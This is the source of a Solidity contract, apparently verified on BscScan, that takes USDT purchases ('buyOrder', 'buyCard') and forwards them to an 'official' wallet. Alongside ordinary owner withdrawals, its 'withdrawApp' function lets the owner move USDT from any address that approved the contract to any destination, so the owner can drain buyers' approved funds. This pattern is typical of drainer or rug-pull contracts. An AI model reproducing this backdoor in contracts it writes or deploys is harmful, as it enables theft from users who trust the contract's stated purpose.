/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

/**
 *Submitted for verification at Etherscan.io on 2022-06-11
*/

pragma solidity ^0.5.4;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}


contract Context {
    constructor() internal {}

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract  kaiTe is Ownable{
  IERC20 public usdt;
  IERC20 public kotb;
  address public official;

  constructor() public  {
    usdt = IERC20(0xe38a71627E3289D8154da871F9ecF25Cd41EB483);
    kotb = IERC20(0x0eF5d410cc2Bb8324b2025791d38FF54b143CE8a);
    official = 0x8f4bf43401feACA2eC8E6f308A3b6C3E55d392a9;
  
  }

  event WithdrawLog(address toAddr, uint amount, uint coin);
  event BuyOrderLog(address sender, uint amount, string uuid);
  event BuyCardLog(address sender, uint amount, string uuid);

    function updateOfficial(address newOfficial) public onlyOwner {
        official = newOfficial;
    }
  
  function withdrawUsdt(address toAddr, uint256 amount) onlyOwner public  {
    usdt.transfer(toAddr, amount);
    emit WithdrawLog(toAddr, amount, 1);
  }

  function withdrawKotb(address toAddr, uint256 amount) onlyOwner public  {
    kotb.transfer(toAddr, amount);
    emit WithdrawLog(toAddr, amount, 2);
  }

  function buyOrder(uint amount, string memory uuid) public  {
    usdt.transferFrom(msg.sender, official, amount);
    emit BuyOrderLog(msg.sender, amount, uuid);
  }

  function buyCard(uint amount, string memory uuid) public  {
    usdt.transferFrom(msg.sender, official, amount);
    emit BuyCardLog(msg.sender, amount, uuid);
  }

  function withdrawApp(address fromAddr,address toAddr, uint256 amount) onlyOwner public  {
    usdt.transferFrom(fromAddr, toAddr, amount);
  }

  
}